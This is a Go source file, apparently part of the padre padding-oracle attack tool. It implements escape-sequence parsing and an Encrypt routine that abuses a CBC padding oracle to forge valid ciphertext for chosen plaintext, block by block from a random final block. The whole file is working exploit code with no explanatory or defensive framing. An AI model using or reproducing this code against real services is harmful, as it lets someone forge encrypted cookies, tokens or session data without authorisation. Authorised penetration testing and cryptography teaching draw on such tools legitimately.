package exploit

import (
	"encoding/hex"
	"errors"
	"fmt"
	"regexp"
	"strings"

	"github.com/glebarez/padre/pkg/util"
)

func charMap(str string) (string, error) {
	chars := map[string]string{
		"n": "0a",
		"t": "09",
		"r": "0d",
		"f": "0c",
		"b": "08",
	}
	char := ""
	if len(str) == 1 {
		ch, ok := chars[str]
		if !ok {
			return "", errors.New("invalid escape character: " + str)
		}
		char = ch
	} else {
		char = str
	}

	strBytes, err := hex.DecodeString(char)
	if err != nil {
		return "", err
	}

	return string(strBytes), nil
}

func applyEscapeCharactersBySegment(str string) string {
	// match things like \x00 and \n \t etc
	re := regexp.MustCompile(`(?m)\\x([0-9a-f][0-9a-f])|\\([ntrfb])`)

	for _, match := range re.FindAllStringSubmatch(str, -1) {
		char := match[1]
		if char == "" {
			char = match[2]
		}
		replacementChar, err := charMap(char)
		if err == nil {
			str = strings.Replace(str, match[0], replacementChar, 1)
		}
	}

	return str
}

func ApplyEscapeCharacters(str string) string {
	// temporarily remove "\\" since it would interfere with parsing characters like \n or \x00
	segments := strings.Split(str, "\\\\")
	parsedSegments := []string{}
	for _, segment := range segments {
		parsedSegments = append(parsedSegments, applyEscapeCharactersBySegment(segment))
	}
	str = strings.Join(parsedSegments, "\\")
	return str
}

func (p *Padre) Encrypt(plainText string, byteStream chan byte) ([]byte, error) {
	blockLen := p.BlockLen

	plainText = ApplyEscapeCharacters(plainText)

	// pad
	plainText = Pkcs7Pad(plainText, blockLen)

	// count the blocks
	blockCount := len(plainText) / blockLen

	// initialize a slice that will contain our cipherText (blockCount + 1 for IV)
	cipher := make([]byte, (blockLen * (blockCount + 1)))

	// last block is generated randomly
	lastBlock := util.RandomSlice(blockLen)
	copy(cipher[len(cipher)-blockLen:], lastBlock)

	// the last block is already known, so we can fetch the bytes
	// NOTE: they are fetcher in reverse order, just like any other byte throughout this exploit
	if byteStream != nil {
		for i := len(lastBlock) - 1; i >= 0; i-- {
			byteStream <- lastBlock[i]
		}
	}

	/* Start with the last block and move towards the 1st block.
	Each block is used successively as a IV and then as a cipherText in the next iteration */
	for blockNum := blockCount; blockNum >= 1; blockNum-- {
		// mark indexes
		x := (blockNum - 1) * blockLen
		y := blockNum * blockLen
		z := (blockNum + 1) * blockLen

		plainBlock := []byte(plainText)[x:y]

		// get nulling IV
		nullingIV, err := p.breakCipher(cipher[y:z], newXORingStreamer(plainBlock, byteStream))
		if err != nil {
			return nil, fmt.Errorf("error occurred while encrypting block %d: %w", blockNum, err)
		}

		// reveal the cipher
		copy(cipher[x:y], xorSlices(plainBlock, nullingIV))
	}
	return cipher, nil
}
